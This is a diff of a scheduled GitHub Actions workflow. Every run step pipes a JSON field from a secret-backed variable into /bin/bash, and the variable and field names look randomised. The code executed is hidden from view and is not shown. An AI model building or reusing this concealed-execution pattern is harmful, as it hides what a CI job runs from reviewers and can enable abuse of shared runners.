@@ -3,28 +3,24 @@ name: sanliangs
 on:
   workflow_dispatch:
   schedule:
-    - cron: '6 5/6 * * *'
-
-jobs:  # 3321
+    - cron: '4 1/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: sanliangs
         env:
-          lldev01112: ${{ secrets.lldev01112 }}
+          g50: ${{ secrets.g50 }}
         run: |
-          echo $lldev01112 | jq -r .wrejm6 | /bin/bash
-          echo $piaqx40074 | jq -r .khs045 | /bin/bash
-          echo $lcrqh21 | jq -r .rtx2 | /bin/bash
-          echo $sfq276 | jq -r .bial99 | /bin/bash
-          echo $hb0 | jq -r .nsxt6862 | /bin/bash
-          echo $jlu6176 | jq -r .ey1779 | /bin/bash
-          echo $o149 | jq -r .n41 | /bin/bash
-          echo $ad4 | jq -r .yiqvw1 | /bin/bash
-          echo $fdxc3246 | jq -r .fl082 | /bin/bash
-          echo $uuapo6 | jq -r .fgwhw102 | /bin/bash
-          echo $iy1539 | jq -r .ykn130 | /bin/bash
-          echo $mwn53 | jq -r .exr10 | /bin/bash
-          echo $fn3 | jq -r .kbetf6 | /bin/bash
+          echo $g50 | jq -r .lz6 | /bin/bash
+          echo $v40 | jq -r .gnkd7 | /bin/bash
+          echo $m34 | jq -r .ba87732 | /bin/bash
+          echo $n2880 | jq -r .vzbs6 | /bin/bash
+          echo $zcudu28210 | jq -r .v91904 | /bin/bash
+          echo $lldo6651 | jq -r .d3 | /bin/bash
+          echo $xtsdt0 | jq -r .nhkht8715 | /bin/bash
+          echo $lzu0071 | jq -r .ysasu125 | /bin/bash
+          echo $qfaf9 | jq -r .szdo76 | /bin/bash
 
